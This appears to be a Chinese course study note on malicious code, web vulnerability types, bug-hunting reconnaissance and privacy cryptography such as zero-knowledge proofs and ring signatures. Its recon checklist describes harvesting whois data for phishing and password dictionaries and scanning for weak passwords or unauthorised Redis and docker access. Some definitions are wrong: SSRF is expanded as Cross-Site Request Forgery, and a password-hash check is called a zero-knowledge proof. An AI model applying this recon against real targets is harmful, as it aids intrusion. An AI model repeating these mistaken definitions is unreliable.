title="7.1.2恶意代码的危害"></a>7.1.2恶意代码的危害</h4><ul><li>破坏数据</li><li>占用磁盘存储空间</li><li>抢占系统资源</li><li>影响计算机运行速度</li></ul><h4 id="7-1-3恶意代码的命名规则"><a href="#7-1-3恶意代码的命名规则" class="headerlink" title="7.1.3恶意代码的命名规则"></a>7.1.3恶意代码的命名规则</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt; </span><br></pre></td></tr></table></figure><blockquote><p>病毒前缀是指一个病毒的种类</p></blockquote><blockquote><p>病毒名是指一个病毒的家族特征，是用来区别和标识病毒家族的</p></blockquote><blockquote><p>病毒后缀是指一个病毒的变种特征，是用来区别具体某个家族病毒的某个变种的</p></blockquote><h3 id="7-2-恶意代码的生存原理"><a href="#7-2-恶意代码的生存原理" class="headerlink" title="7.2 恶意代码的生存原理"></a>7.2 恶意代码的生存原理</h3><h4 id="7-2-1恶意代码的生命周期"><a href="#7-2-1恶意代码的生命周期" class="headerlink" title="7.2.1恶意代码的生命周期"></a>7.2.1恶意代码的生命周期</h4><p>•设计期：用编程语言制造一个恶意代码</p><p>•传播期：通过不同的途径散布和侵入受害系统中</p><p>•感染期：找到自己依附或隐藏的宿主，并实施依附或隐藏</p><p>•触发期：满足触发条件时，恶意代码进入运行期</p><p>•运行期：恶意代码的恶意目的得以展现</p><p>•消亡期：恶意代码被检测出来，并应用相应的手段进行处理</p><h4 id="7-2-2恶意代码的传播机制"><a href="#7-2-2恶意代码的传播机制" class="headerlink" title="7.2.2恶意代码的传播机制"></a>7.2.2恶意代码的传播机制</h4><ul><li><p>恶意代码传播主要是通过<strong>复制文件、传送文件、运行程序</strong>等方式进行。</p></li><li><p><strong>主要传播机制</strong>：</p></li></ul><p>​ 互联网</p><p>​ 局域网</p><p>​ 移动存储设备</p><p>​ 无线设备和点对点通信系统</p><h4 id="7-2-3恶意代码的感染机制"><a href="#7-2-3恶意代码的感染机制" class="headerlink" title="7.2.3恶意代码的感染机制"></a>7.2.3恶意代码的感染机制</h4><p><strong>感染执行文件</strong></p><p> <span style = "color: blue">主要感染.exe 和 .dll 等可执行文件和动态连接库文件</span></p><p> 根据恶意代码感染文件的方式不同，可以分为外壳型恶意代码、嵌入型恶意代码、源代码型恶意代码、覆盖型恶意代码和填充型恶意代码等</p><p><strong>感染引导区</strong></p><p> 如果恶意代码感染了引导区，开机后，它被读入内存时，杀毒软件还没有读入内存，恶意代码就获得了系统控制权，改写操作系统文件，隐藏自己</p><p><strong>感染结构化文档</strong></p><p> 宏病毒是一种寄存在文档或模板的宏中的恶意代码。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上</p><h4 id="7-2-4恶意代码的触发机制"><a href="#7-2-4恶意代码的触发机制" class="headerlink" title="7.2.4恶意代码的触发机制"></a>7.2.4恶意代码的触发机制</h4><ul><li><p>恶意代码在传染和发作之前，往往要判断某些特定条件是否满足，满足则传染或发作，否则不传染或不发作或只传染不发作</p></li><li><p>日期触发</p></li><li><p>时间触发</p></li><li><p>键盘触发</p></li><li><p>感染触发</p></li><li><p>启动触发</p></li><li><p>访问磁盘次数触发</p></li><li><p>调用中断功能触发</p></li><li><p>CPU型号&#x2F;主板型号触发</p><p>被恶意代码使用的触发条件是多种多样的，<strong>而且往往不只是使用上面所述的某一个条件，而是使用由多个条件组合起来的触发条件</strong></p></li></ul><h3 id="7-3-恶意代码的分析与检测技术"><a href="#7-3-恶意代码的分析与检测技术" class="headerlink" title="7.3 恶意代码的分析与检测技术"></a>7.3 恶意代码的分析与检测技术</h3><h4 id="7-3-1恶意代码的分析方法"><a href="#7-3-1恶意代码的分析方法" class="headerlink" title="7.3.1恶意代码的分析方法"></a>7.3.1恶意代码的分析方法</h4><p><strong>静态分析法</strong>:</p><p> 在不执行恶意代码的情况下进行分析。</p><p> 可以分为源代码分析、反汇编分析、二进制统计分析三种情况</p><p><strong>动态分析法</strong>:</p><p> 通过检测恶意代码执行的过程，分析执行过程中的操作。</p><p><strong>在实际应用中，一般将恶意代码分析方法分成三类：</strong></p><p>基于<strong>代码特征</strong>的分析方法</p><ul><li>首先，获取一个病毒程序的长度，根据长度可以将文件分为几份</li><li>然后，每份中选取通常为16或32个字节长的特征串</li><li>最后，将选取出来的几段特征码及它们的偏移量存入病毒库，标示出病毒的名称</li></ul><hr><p>基于<strong>代码语义</strong>的分析方法</p><ul><li>通过各种渠道收集到最新的未知恶意代码样本时，进行文件格式分析</li><li>对样本文件的属性进行查看分析</li><li>对样本的行为进行分析，分析它的本地感染行为，以及网络传播行为</li><li>通过静态反汇编工具（IDA等）对的恶意代码程序的PE文件进行反汇编</li><li>通过动态调试对恶意代码加载调试，进一步分析代码的操作</li></ul><hr><p>基于<strong>代码行为</strong>的分析方法</p><blockquote><p>基于以下理论展开：软件行为&#x3D; API + 参数</p></blockquote><p>about软件行为：</p><p><code>六大类常见软件恶意行为</code></p><ul><li>修改注册表启动项</li><li>修改关键文件</li><li>控制进程</li><li>访问网络资源</li><li>修改系统服务</li><li>控制窗口</li></ul><h4 id="7-3-2-恶意代码的检测方法"><a href="#7-3-2-恶意代码的检测方法" class="headerlink" title="7.3.2 恶意代码的检测方法"></a>7.3.2 恶意代码的检测方法</h4><ul><li><p>基于特征码的检测法</p></li><li><p>启发式检测法</p></li></ul><p>​（通过对某种恶意代码调用内核函数的名称和次数进行分析，建立恶意代码内核函数调用集合，比较待查程序调用的内核函数和数据库中已知恶意代码的内核函数调用集合的贴近度）</p><ul><li><p>基于行为的检测法</p></li><li><p>完整性验证法</p></li><li><p>基于特征函数的检测方法（发现调用危险的特殊函数）</p></li></ul><h3 id="7-4-恶意代码的清除与预防技术"><a href="#7-4-恶意代码的清除与预防技术" class="headerlink" title="7.4 恶意代码的清除与预防技术"></a>7.4 恶意代码的清除与预防技术</h3><h4 id="7-4-1恶意代码的清除技术"><a href="#7-4-1恶意代码的清除技术" class="headerlink" title="7.4.1恶意代码的清除技术"></a>7.4.1恶意代码的清除技术</h4><ul><li>选择适当的封锁策略</li></ul><p>​ 鉴别和隔离被感染主机</p><p>​ 阻塞发送出的访问</p><p>​ 关闭邮件服务器</p><p>​ 断开局域网与因特网的连接</p><ul><li><p>感染来源线索的收集和处理</p></li><li><p>杀除与恢复</p></li></ul><h4 id="7-4-2恶意代码的预防技术"><a href="#7-4-2恶意代码的预防技术" class="headerlink" title="7.4.2恶意代码的预防技术"></a>7.4.2恶意代码的预防技术</h4><ul><li>使用反病毒软件</li><li>阻塞可疑文件</li><li>限制使用不必要的具有传输能力的文件</li><li>安全处理邮件附件</li><li>避免开放网络共享</li><li>使用Web浏览器的安全机制限制移动代码</li><li>设置邮件客户端</li></ul><h3 id="7-5-漏洞的基本概念"><a href="#7-5-漏洞的基本概念" class="headerlink" title="7.5 漏洞的基本概念"></a>7.5 漏洞的基本概念</h3><p><strong>漏洞</strong>（ Vulnerability），是指计算机系统安全方面的缺陷，使得系统或其应用数据的保密性、完整性、可用性、访问控制等面临威胁。</p><p><strong>许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（</strong>Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。</p><p><strong>POC</strong> （Proof of concept）是对某些想法的一个较短而不完整的实现，以证明其可行性，示范其原理，其<strong>目的是为了验证一些概念或理论</strong>。概念验证通常被认为是一个有里程碑意义的实现的原型 。</p><p>在计算机安全术语中，<strong>概念验证经常被用来作为0day、exploit的别名</strong>。（通常指并没有充分利用这个漏洞的exploit）</p><p><strong>漏洞利用</strong> （Exploit，简称为EXP）是计算机安全术语，指的是利用程序中的某些漏洞，来得到计算机的控制权（使自己编写的代码越过具有漏洞的程序的限制，从而获得运行权限）。在英语中，表示为了利用漏洞而编写的攻击程序，即漏洞利用程序。</p><p><strong>零日漏洞</strong> （zero-day vulnerability、0-day vulnerability）通常是指还没有补丁的安全漏洞，而<strong>零日攻击</strong>（zero-day exploit、zero-day attack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。</p><h3 id="7-6-漏洞挖掘技术的定义及分类"><a href="#7-6-漏洞挖掘技术的定义及分类" class="headerlink" title="7.6 漏洞挖掘技术的定义及分类"></a>7.6 漏洞挖掘技术的定义及分类</h3><p><strong>漏洞挖掘</strong> 是指查找目标系统中可能存在的漏洞，在这个过程中，需要运用多种计算机技术和工具。   </p><p>根据挖掘对象的不同，<strong>漏洞挖掘一般可以分为两大类</strong>，即<strong>基于源代码的漏洞挖掘</strong>和<strong>基于目标代码的漏洞挖掘。</strong></p><p>   对于基于源代码的漏洞挖掘来说，<strong>首先要获取</strong>系统或软件的<strong>源代码程序</strong>，采取<strong>静态分析</strong>或<strong>动态调试</strong>的方式<strong>查找</strong>其中可能存在的<strong>安全隐患</strong>。但大多数商业软件的源代码很难获得，一般只有一些开源系统能为挖掘者提供源码，如LINUX系统，所以目前基于源代码的挖掘一般都是LINUX系统及其开源软件。对于<strong>不能提供源码的系统或软件</strong>而言，只能<strong>采用基于目标代码的漏洞挖掘方法</strong>，该方法一般涉及程序编译器、计算机硬件指令系统、可执行文件格式等方面的分析技术，<strong>实现难度较大</strong>。</p><p><strong>WEB漏洞</strong> <strong>：</strong>通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有<strong>Sql注入、Xss漏洞、上传漏洞</strong>等。</p><p><strong>XSS</strong> (Cross-Site Scripting)，跨站脚本，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本是指通过存在安全漏洞的Web网站，在用户的<strong>浏览器内运行非法的HTML</strong>或<strong>JavaScript</strong>进行的一种攻击。</p><p><strong>SQL注入</strong> 就是指Web应用程序对<strong>用户输入数据的合法性没有判断</strong>，前端传入后端的参数是<strong>攻击者可控</strong>的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。</p><p><strong>CSRF</strong>（Cross-Site Request Forgery）中文意思为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。</p><p><strong>SSRF</strong>（Cross-Site Request Forgery）中文为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。</p><p><strong>文件上传漏洞</strong> 是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><p><strong>命令执行</strong> 应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p><strong>逻辑漏洞</strong> 就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。</p><h3 id="7-7-漏洞挖掘技术的一般流程"><a href="#7-7-漏洞挖掘技术的一般流程" class="headerlink" title="7.7 漏洞挖掘技术的一般流程"></a>7.7 漏洞挖掘技术的一般流程</h3><p><strong>阅读规则确定测试范围</strong></p><p><strong>信息搜集-子域名收集</strong></p><p><strong>工具：DNS枚举：一台服务器、一个工具</strong></p><p>​DNSenum是一款非常强大的域名信息收集工具。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器、邮件交换记录，还可以在域名服务器上执行axfr请求，然后通过谷歌脚本得到扩展域名信息，提取出域名并查询，最后计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p><p>在Kali Linux安全渗透教程新手版中讲解过该工具的基本使用。这里讲解一下该工具的字典破解子域名功能。</p><p>首先使用-f选项指定一个常见子域名字典文件；然后使用-u选项，设置字典文件更新方式。当设置a，则将本次执行过程中，从其他图形获取的子域名添加到该文件中。这样，就相当于维护了字典文件。</p><p>​坑： 1.泛解析 2.不够全面 </p><p><strong>子域名收集–泛解析问题</strong></p><p><strong>信息搜集-C段资产收集</strong></p><p><strong>信息搜集–移动端资产收集</strong></p><p><strong>信息搜集–同备案号资产收集</strong></p><h3 id="7-8-漏洞挖掘技术的常用方法和工具"><a href="#7-8-漏洞挖掘技术的常用方法和工具" class="headerlink" title="7.8 漏洞挖掘技术的常用方法和工具"></a>7.8 漏洞挖掘技术的常用方法和工具</h3><p><strong>黑盒测试指</strong>把被测试目标看做一个黑盒子，<strong>对于内部结构、运作情况是不可见的</strong>。模拟黑客的攻击行为，找出目标点存在的漏洞</p><p>  在黑盒漏洞挖掘中，必须要做的事就是对目标资产的收集，收集的资产越多，越容易挖出漏洞</p><p><strong>白盒审计</strong>是已知源代码，根据源代码审计漏洞</p><p><strong>审计方法简介</strong></p><p>1.定位敏感关键字，回溯参数传递过程</p><p>2.定位敏感功能点，通读功能点代码(系统重装、文件上传、文件功能管理、登录认证、密码找回、订单支付)</p><p>3.通读全文</p><p>方法1 优势在于能快速审计，代码量小，容易找到漏洞点，但是也容易忽略很多漏洞，如逻辑漏洞无法这样审计得到</p><p>方法2 优势在于代码量比通读全文小，能审计出逻辑漏洞</p><p>方法3 不会出现忽略漏洞的情况，但是代码量大，耗费时间长</p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>（列出信息收集需要收集的点）</p><p>1.<strong>查询网站whois信息</strong>，从whois和网站中获取注册者的电话、姓名、邮箱等信息方便后期社工钓鱼生成专属密码字典等<br> 2.<strong>shadon、fofa等网络资产搜索引擎</strong>，天眼查网站的相关产权获得一些资产、github敏感信息泄露、各种网盘搜索引擎、微信公众号、服务号、小程序、app等<br> 3.<strong>查看网站旁站和子域名</strong>(主站一般防护都挺严)，网站都查询一下网站指纹是否存在通用CMS漏洞<br> 4.<strong>查看服务器操作系统版本，Web中间件，网站语言等等</strong>，看看有没有可以利用的Web中间件漏洞<br> 5.<strong>网站目录扫描</strong>，看看有没有敏感信息和接口泄露，如网站管理后台、网站源码备份、git泄露、phpinfo等<br> 6.<strong>用JSFinder从网站JS里面提取信息</strong>，看有没有敏感接口和链接，顺便在收集一下子域名看有没有之前漏掉的<br> 7.<strong>使用全球ping查看网站</strong>是否存在cdn（CDN是指内容分发网络）<br> 8.<strong>端口扫描</strong>，查看有无可利用端口，如ftp、ssh的弱口令，rsync、Redis、docker等的未授权访问等</p><p>（rsync是linux系统下的数据镜像备份工具）</p><h4 id="关于扫描"><a href="#关于扫描" class="headerlink" title="关于扫描"></a>关于扫描</h4><p><strong>whois</strong></p><p>它能查询到域名注册者的信息</p><p><strong>Dirbuster&amp;御剑</strong></p><p>这两款工具都是网站目录扫描工具，可以扫描敏感信息及接口</p><p><strong>Google hacking</strong></p><p>可以用来指定搜索语法搜索自己想要的内容，如网站后台搜索，子域名搜集，具体事物的信息收集</p><p><strong>whatweb</strong></p><p>可以用来获取目标网站web容器，操作系统，ip地址，是否有某cms指纹等等信息</p><p><strong>JSFinder</strong></p><p>可以用来从网站js里面提取敏感接口和子域名</p><p><strong>nmap</strong></p><p>可以用来进行端口扫描以及探测存活主机</p><p><strong>awvs</strong></p><p>用来进行漏洞扫描</p><p><strong>xray</strong></p><p>可以直接用来进行漏洞扫描</p><h4 id="关于审计"><a href="#关于审计" class="headerlink" title="关于审计"></a>关于审计</h4><p><strong>phpstorm</strong></p><p>既然要审计代码，那么要有一款好的ide，如phpstrom、vscode等，结合Xdebug方便跟踪调试代码</p><p><strong>rips</strong></p><p>rips能够自动审计，给出一些可能存在漏洞的地方以及漏洞类型，然后人为去验证判断，能减少很多审计时间</p><p><strong>Seay源代码审计系统</strong></p><p>类似于rips也是一款自动审计工具</p><h2 id="八-隐私威胁与保护"><a href="#八-隐私威胁与保护" class="headerlink" title="八.隐私威胁与保护"></a>八.隐私威胁与保护</h2><h3 id="隐私保护技术"><a href="#隐私保护技术" class="headerlink" title="隐私保护技术"></a>隐私保护技术</h3><p>隐私保护技术是指一系列用于保护用户隐私信息安全的技术手段，主要包括加密技术、身份识别技术、数据去标识化技术等。隐私保护技术的发展在一定程度上可以保护个人隐私信息免受不法侵害，起到保障用户权益和数据安全的作用。</p><p>具体来说，隐私保护技术发展的作用包括：</p><p>   <strong>数据加密保护</strong>：通过加密技术，对数据进行加密后再传输，可以有效防止数据在传输过程中被窃取或篡改。</p><p>   <strong>匿名化处理</strong>：通过数据去标识化技术，将用户的个人信息和身份与特定的行为或数据解耦，从而保护用户的个人隐私。</p><p>   <strong>身份验证技术</strong>：使用生物特征识别、二次验证等技术确保用户的身份安全，防止非法用户冒充他人身份。</p><p>   <strong>隐私政策和控制</strong>：通过隐私政策和隐私控制工具，用户可以了解数据收集和使用情况，并自主选择是否分享个人信息。</p><p>   <strong>安全存储和访问控制</strong>：通过访问控制和安全存储技术，确保个人敏感信息只能被授权人员访问，避免数据泄露。</p><p>隐私保护技术涉及的密码技术内容主要包括同态加密、环签名技术、安全多方计算和零知识证明等。</p><h3 id="密码知识"><a href="#密码知识" class="headerlink" title="密码知识"></a>密码知识</h3><ol><li><h4 id="在区块链中应用"><a href="#在区块链中应用" class="headerlink" title="在区块链中应用"></a>在区块链中应用</h4></li></ol><p>​    同态加密首先运用在云计算和大数据中。对于区块链技术，<strong>同态加密也是很好的互补。使用同态加密技术，运行在区块链上的智能合约可以处理密文，而无法获知真实数据，极大地提高了隐私安全性。</strong></p><p>​    对于区块链网络用户来说，希望提交到区块链网络中的数据安全性能得以保证，尤其是重要敏感数据的安全性，应避免恶意的信息泄露和篡改。同态加密技术能够使用户的密文数据在区块链智能合约中密文运算，而非传统的明文运算。这样的优点是，用户将交易数据提交到区块链网络之前，可使用相应的加密算法对交易数据进行加密，数据以密文的形式存在，即使被攻击者获取，也不会泄露用户的任何隐私信息，同时密文运算结果与明文运算结果一致。</p><ol start="2"><li><h4 id="同态加密在区块链中的具有如下应用："><a href="#同态加密在区块链中的具有如下应用：" class="headerlink" title="同态加密在区块链中的具有如下应用："></a>同态加密在区块链中的具有如下应用：</h4><p><strong>数据隐私保护</strong>：在区块链中，大量的交易和数据需要被记录和验证，而同态加密技术可以确保这些数据在被存储和共享时保持加密状态，仅有授权用户才能访问和运算。</p><p><strong>智能合约安全性</strong>：智能合约是区块链中一种自动执行合约的机制，同态加密可以用于保护智能合约中的敏感数据，确保合约的安全性和隐私性。</p><p><strong>隐私保护的数据共享</strong>：区块链上的数据共享有时需要保护数据的隐私性，而同态加密可以使多方在密文状态下共享和处理数据，以保护数据隐私。</p><p><strong>安全数据分析</strong>：利用同态加密技术，区块链可以实现对加密数据集合进行计算分析，避免泄露隐私信息的同时仍然可以获得有用的数据分析结果。</p></li></ol><h4 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a><strong>零知识证明</strong></h4><p>指的是<strong>证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的</strong>。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。</p><p><span style = "color: red;">零知识证明：零知识，即在证明的过程中不透露任何内情。通俗的来讲，就是既证明了自己想证明的事情，同时透露给验证者的信息为“零”。</span></p><p>证明举例</p><p>  （1）用户在系统注册时，系统不会保存用户的密码明文，而是保存了密码的哈希值；用户在登录系统时，只需要输入注册时的密码，系统会根据用户输入密码产生的哈希值与系统数据库保存的哈希值进行比对。如果一致，则系统认为——当前登录用户知道该账号的密码。</p><p>这样，用户不需要告诉网站密码，就能证明自己的身份。这其实就是一种零知识证明。</p><p>  （2）B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p>  （3）A要去公司实习，公司要求A在校所有功课没有挂科，才有资格加入公司。A虽然所有功课都没有挂科，但都在61、62左右徘徊；A不想让公司看到自己的成绩单，于是A委托学校开了一个证明：证明A在校所有功课全部及格。并交到了公司，加入了公司。</p><p>这样，A既没暴露自己的确切考试成绩，又向公司证明自己满足要求。这其实就是零知识证明。</p><p>4）A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天2人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。</p><p>   ①B把自己的私钥给A，A用这个私钥对某个数据加密，然后用B的公钥解密，如果正确，则证明对方确实是B。</p><p>   ②A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。</p><p>第二种方法属于零知识证明。</p><p><strong>零知识证明的特点：</strong></p><p> （1）隐私保护：零知识证明允许在不泄露敏感信息的前提下向他人证明某个主张的真实性，从而保护了个人的隐私和数据安全。</p><p> （2）不可伪造性：零知识证明要求证明者以一种无法被伪造的方式向验证者证明某个主张的真实性，确保了证明的可靠性和完整性。</p><p> （3）交互式验证：零知识证明通常需要证明者和验证者之间进行多轮的交互式通讯和计算，以确认证明的有效性。</p><p><strong>应用场景：</strong></p><p>（1）身份验证：用户可以使用零知识证明向服务提供者证明自己拥有正确的身份信息，而无需透露具体的个人信息。这有助于保护用户的隐私并防止身份盗窃。</p><p>（2）支付系统：在电子支付系统中，用户可以使用零知识证明向商家证明自己有足够的资金进行支付，而无需透露具体的账户余额或其他财务信息。这有助于保护用户的财务隐私并提高支付系统的安全性。</p><p>（3）知识产权保护：企业可以使用零知识证明来保护自己的知识产权，例如专利、商标或版权。他们可以证明自己拥有某个专利或商标的权利，而无需公开具体的专利内容或商标细节。</p><p>（4）区块链应用：零知识证明在区块链技术中也有着广泛的应用。例如，在加密货币交易中，用户可以使用零知识证明来证明自己拥有足够的加密货币进行交易，而无需透露具体的交易历史或地址余额等信息。这有助于提高交易的隐私性和安全性。</p><p><strong>应用实例：</strong></p><p>目前ZCASH（大零币）使用零知识机制来证明交易有效，在ZCASH中，摒弃了之前的UTXO方式，而是使用了一种基于UTXO，被称为NOTE（支票）的新方式代替。NOTE代表了当前账户对资产的支配权，与UTXO不同，账户余额的存储方式不再是“未消费的交易输出”，而是“未被作废的支票（NOTE）”；一个NOTE是由所有者公钥PK、所拥有金额V、和唯一区分支票的序列号r组成，表示为NOTE&#x3D;(PK， v， r)</p><p>   ZCash交易分为两类：透明地址交易和隐藏地址交易。透明地址交易的输入、输出直接是可见的NOTE信息；隐藏地址交易，输入和&#x2F;或输出的地址和金额是隐藏的。</p><p>   在ZCASH的隐藏地址交易中，交易的输入输出不再是明文的NOTE，而是NOTE的签发和废弃通知。如下图：</p><p><img src="https://s2.loli.net/2024/11/27/6jBk8FwCTzaYps9.png" alt="1.png"></p><p> 左侧代表的是“签发的新的NOTE”，右侧代表的是“作废的NOTE”。每次进行转账，就会把转账方的NOTE放到作废列表里，代表此NOTE已经作废，同时为收款方创建一张等额的NOTE。这样就实现了“资产的转移”，并且由于都是记录的NOTE的哈希值，因此并不知道被废弃的和新签发的NOTE的内容，这样就做到了隐藏交易双方及交易细节。</p><p>   <strong>矿工如何确认这些匿名交易？</strong></p><p>在矿工确认交易时，转账方会提供一个证明P，能够证明：转账方通过金额V、公钥PK、支票序列号r计算后的哈希值，与在签发列表中存在的哈希值一致，这足以证明转账方的NOTE存在。这样既没有泄露转账方的信息，又证明了NOTE存在。</p><p>   矿工确认NOTE存在后，就会在作废列表中查询，如果没有此笔NOTE的作废记录，则证明转账方NOTE有效（防止双花）。然后再在作废列表中，把当前NOTE的序列号哈希计算后的值记录在作废列表中，表明此笔NOTE已经作废，同时为收款方签发新的NOTE。</p><p>   至此，就可以在区块链中应用零知识证明来保护交易双方隐私了。</p><h4 id="环签名技术"><a href="#环签名技术" class="headerlink" title="环签名技术"></a>环签名技术</h4><p>环签名解决的问题是，我对你说了一句话，但是你只知道是某一群人中有人对你说了这句话，而不知道这群人里具体哪个人说的。简言之就是，我把自己藏进了人群里。环签名通过将实际签名者的公钥藏进一个公钥集合，来达到保护签名者身份的目的。</p><p><strong>环签名具有保护签名者隐私和身份匿名的特性，适用于需要保护参与者身份和行为隐私的场景。通过环签名技术，签名者能够在不暴露自己身份的情况下签署消息，确保数据的安全性和隐私性。</strong></p><p>环签名也被称为 CryptoNote，由群签名演化而来，典型的应用案例是<strong>门罗币</strong>。群签名是利用公开的群公钥和群签名进行验证的方案，其中群公钥是<strong>公开</strong>的，群成员可以生成群签名，验证者能利用群公钥验证所得群签名的正确性，但不能确定群中的正式签名者。可是群管理员可以撤销签名，揭露真正的签名者群签名，这是群签名的关键问题所在。</p><p>   环签名方案则去掉了群组管理员，不需要环成员之间的合作，<strong>签名者利用自己的私钥和集合中其他成员的公钥就能独立的进行签名，集合中的其他成员可能不知道自己被包含在了其中。</strong>这种方案的优势除了能够对签名者进行无条件的匿名外，环中的其他成员也不能伪造真实签名者签名。外部攻击者即使在获得某个有效环签名的基础上，也不能伪造一个签名。</p><ol><li><p>匿名性保护。环签名可以防止交易链上的身份追踪：在使用环签名进行交易签名时，签名者的身份被隐藏在一个成员固定大小的环中，无法被外部观察者追踪。因此，交易链上的身份追踪变得更加困难，保护了用户的交易隐私和身份隐私。并且签名者可以在一个匿名的环中签署交易，使得用户在区块链上的交易活动不会暴露其真实身份，提高了用户交易的匿名性。</p></li><li><p>数据隐私保护。环签名可以保护交易内容的机密性：环签名技术不仅可以保护用户的身份隐私，还能保护交易内容的机密性。即使区块链上的所有交易信息都是公开的，但通过环签名，交易内容仍然可以保持加密私密状态，不易被外部方获取。</p></li><li><p>抗审查性保护。环签名可以防止审核和审查：通过环签名技术，区块链中的交易可以在签署者身份的保护下完成，无法被审查者追踪。这使得黑客、监视者和第三方无法通过分析区块链中的信息来获取用户的隐私信息。</p></li><li><p>信任建立。环签名可以建立信任：通过提高用户的身份和数据隐私保护水平，环签名技术有助于建立用户和社区之间的信任关系。用户可以更加放心地在区块链上进行交易和参与各种智能合约活动</p></li></ol><h3 id="隐私威胁与保护"><a href="#隐私威胁与保护" class="headerlink" title="隐私威胁与保护"></a>隐私威胁与保护</h3><p><strong>数据泄露</strong>是指系统信息被未经授权的人或组织获取，这可能导致各种威胁问题。数据泄露引起隐私威胁的主要原因：</p><p>   网络安全漏洞：许多网站和应用程序可能存在安全漏洞，这些漏洞可能被黑客利用来窃取用户数据。</p><p>   人为错误：个人或组织在处理敏感信息时可能会犯错。</p><p>   恶意软件：病毒、间谍软件等恶意软件可以窃取系统的敏感数据。</p><p>   社交工程攻击：黑客通过欺骗手段诱使个人泄露自己的敏感信息，例如通过假冒的电子邮件或电话请求密码重置。</p><p>   不安全的网络连接：在公共Wi-Fi网络上进行敏感操作可能会导致数据被截获。</p><p>区块链面临的一些隐私威胁：</p><p>   交易信息隐私泄露：区块链上的交易信息，如发送者、接收者和交易金额，可能会被泄露。为了保护这些信息，可以采用混币、环签名和机密交易等技术。</p><p>   智能合约隐私漏洞：智能合约可能存在漏洞，如果被黑客利用，可能会导致系统崩溃或交易数据泄露。为了防范这一风险，可以采用零知识证明、多方安全计算、同态加密等技术来保护合约数据。</p><p>   链上数据隐私泄露：区块链上的交易数据虽然与用户身份信息分离，但仍有可能通过分析交易模式来追踪用户的身份。为了进一步保护隐私，可以采用账本隔离、私有数据和数据加密授权访问等解决方案。</p><p>以下从<strong>用户身份隐私、交易隐私、网络隐私、通信隐私</strong>几个方面分析区块链技术隐私泄露问题</p><h5 id="用户身份隐私"><a href="#用户身份隐私" class="headerlink" title="用户身份隐私"></a>用户身份隐私</h5><p>​用户身份隐私主要是指交易双方的地址信息，其本质是双方公钥的哈希值。在早期时候，因为这种地址的匿名特性，交易的所有数据都是公开的。但随着技术的发展，可以通过拓扑学、社会学、统计学以及溯源技术等一系列知识，分析得到交易双方在现实世界的真实信息，用户的隐私信息更会受到极大的威胁。</p><p>   最常用的解决方案主要是混币机制，也就是将多笔交易混合在一起，切断加密货币中交易方与接收方的联系，提高加密货币的隐私性和匿名性。</p><p>混币过程的执行可以由可信第三方或者是某种协议执行，根据这种特性，混币机制也可分为基于中心化结点的混币机制和去中心化的混币机制。</p><p>   基于中心化的混币机制：其本质是单纯地将一笔资金在多个地址中多次转移，实现简单、易于操作，在现有的各类数字货币系统中具有极高的适用性。但中心化混币机制普遍存在额外收费和时延问题，第三方节点的可信度也得不到保证，以此也容易引发第三方盗窃资金、泄露混币过程的风险。盲签名技术虽然可以降低混币过程泄露的风险，但又会引起混币计算代价增高。</p><p>   